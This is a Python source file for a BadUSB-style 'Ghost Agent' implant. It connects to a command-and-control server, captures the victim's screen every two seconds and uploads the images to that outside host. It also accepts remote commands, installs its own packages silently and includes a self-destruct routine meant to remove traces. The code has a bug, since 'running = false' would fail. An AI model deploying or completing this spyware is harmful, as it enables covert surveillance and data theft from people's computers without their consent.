import time
import base64
import sys
import threading
import io
import socketio
try:
    from PIL import ImageGrab
except ImportError:
    print("Installing PIL...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pillow", "python-socketio", "requests", "websocket-client"])
    from PIL import ImageGrab

# Configuration
SERVER_URL = "https://esp32-badusb.onrender.com/" # Change this to your deployed Render URL later
HEARTBEAT_INTERVAL = 1.0 # seconds
SCREENSHOT_INTERVAL = 2.0 # seconds

sio = socketio.Client()
current_mode = "B" # Default to safety mode
running = True

def print_log(msg):
    print(f"[AGENT] {msg}")

@sio.event
def connect():
    print_log("Connected to C2 Server!")
    sio.emit('identify', 'agent')

@sio.event
def set_mode(mode):
    global current_mode
    current_mode = mode
    print_log(f"Mode switched to: {current_mode}")

@sio.event
def execute_command(cmd):
    print_log(f"Received Command from C2: {cmd}")
    # In a real AI scenario, you would pass this to an LLM or PyAutoGUI to actually click/type.
    # For now, we just print it.
    if cmd.lower() == "test":
        print_log("Executing test command...")
    elif cmd.lower() == "kill":
        print_log("Kill command received. Self-destructing.")
        self_destruct()

@sio.event
def disconnect():
    print_log("Disconnected from server.")

def send_screenshots():
    """Background thread to capture screen and send to server."""
    global running
    while running:
        if sio.connected:
            try:
                # Capture screen
                screenshot = ImageGrab.grab()
                
                # Compress image
                buffer = io.BytesIO()
                screenshot.thumbnail((1280, 720)) # Resize to save bandwidth
                screenshot.save(buffer, format="JPEG", quality=60)
                img_str = base64.b64encode(buffer.getvalue()).decode("utf-8")
                
                # Send to server
                sio.emit('screenshot_data', img_str)
            except Exception as e:
                print_log(f"Screenshot error: {e}")
        
        time.sleep(SCREENSHOT_INTERVAL)

def check_heartbeat_usb():
    """Simulates checking if ESP32 USB is still plugged in."""
    # In reality, this would check if a specific COM port exists or ping a local IP
    # For demonstration, we assume it's always "plugged in" unless simulated otherwise.
    return True

def self_destruct():
    """Kills the agent and removes traces."""
    global running
    print_log("Initiating Self-Destruct Sequence...")
    running = false
    sio.disconnect()
    sys.exit(0)
    # In real BadUSB, you would also delete os.path.abspath(__file__)

def main_loop():
    global running
    print_log("Ghost Agent Started.")
    
    # Start screenshot thread
    threading.Thread(target=send_screenshots, daemon=True).start()
    
    while running:
        try:
            # 1. Check USB Heartbeat
            usb_present = check_heartbeat_usb()
            
            if not usb_present and current_mode == 'B':
                print_log("CRITICAL: ESP32 Unplugged while in Mode B. Self destructing!")
                self_destruct()
                
            # 2. Send network heartbeat to C2 server
            if sio.connected:
                sio.emit('heartbeat')
                
            time.sleep(HEARTBEAT_INTERVAL)
            
        except KeyboardInterrupt:
            running = False
            break

if __name__ == '__main__':
    try:
        sio.connect(SERVER_URL)
        main_loop()
    except Exception as e:
        print_log(f"Connection failed: {e}")
